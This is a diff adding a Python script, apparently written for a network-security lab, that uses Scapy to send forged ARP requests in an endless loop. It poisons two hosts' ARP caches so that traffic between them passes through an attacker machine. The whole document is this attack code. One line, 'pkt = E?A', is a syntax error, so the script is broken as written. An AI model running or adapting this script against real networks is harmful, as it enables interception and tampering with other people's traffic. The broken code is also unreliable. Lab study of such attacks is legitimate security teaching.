@@ -1,0 +1,21 @@
+from scapy.all import *
+import time
+ip_A = "10.9.0.5"
+ip_B = "10.9.0.6"
+ip_M = "10.9.0.105"
+mac_A = "02:42:0a:09:00:05"
+mac_B = "02:42:0a:09:00:06"
+mac_M = "02:42:0a:09:00:69"
+
+while 1:
+        E = Ether(dst=mac_A,src=mac_M)
+        A = ARP(hwsrc=mac_M,psrc=ip_B,pdst=ip_A,hwdst=mac_A)
+        A.op=1
+        pkt = E/A
+        sendp(pkt)
+        E = Ether(dst=mac_B, src=mac_M)
+        A = ARP(hwsrc=mac_M,psrc=ip_A,pdst=ip_B,hwdst=mac_B)
+        A.op=1
+        pkt = E?A
+        sendp(pkt)
+        time.sleep(5)
